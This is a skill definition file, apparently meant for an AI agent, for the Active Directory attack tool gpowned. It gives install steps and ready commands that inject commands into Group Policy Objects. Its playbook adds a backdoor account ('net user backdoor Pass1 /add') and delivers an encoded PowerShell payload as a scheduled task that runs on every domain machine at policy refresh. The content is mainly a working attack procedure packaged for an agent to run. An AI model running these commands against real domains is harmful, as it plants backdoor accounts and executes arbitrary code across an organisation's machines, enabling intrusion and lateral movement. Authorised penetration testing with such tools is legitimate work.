---
name: gpowned-gpo-abuse
description: "gpowned deploys malicious scheduled tasks through GPOs. Signals: AD attack, domain penetration, authentication and GPO enumeration, GPO command injection, scheduled-task delivery."
zh-signals: "gpowned: GPO 内下发恶意计划任务。信号:ad攻击,域渗透,认证+GPO 枚举,GPO 命令注入,计划任务方式下发。"
when-to-use: >-
  Use during Active Directory penetration testing when you have credentials and
  GPO control, to enumerate GPOs and inject commands or scheduled tasks that
  execute across domain machines on policy refresh.
---

# gpowned

- Attack Category: C30 AD and Lateral Movement
- Upstream Repository: https://github.com/X-C3LL/gpowned
- Upstream License: BSD-3-Clause (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
pip install gpowned
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `gpowned auth -d corp.local -u svc -p pass` | Authentication plus GPO enumeration |
| `gpowned abuse -d corp.local -u svc -p pass -gpo-name '{GPO}' -command 'net user backdoor Pass1 /add'` | GPO command injection |
| `-scheduled-task` | Deliver via a scheduled task |
| `-immediate-task` | Deliver via an immediate task |

## Attack Scenario Playbook

### Deploying malicious scheduled tasks through GPOs

```bash
gpowned abuse -d corp.local -u svc -p pass -gpo-name '{ABCD-1234}' -scheduled-task -command 'powershell.exe -enc <b64>'
# Domain machines execute on Group Policy refresh
```

## Notes

Full GPO abuse chain: enumerate → insert a scheduled task/immediate task into the GPO → execute across the domain in bulk.
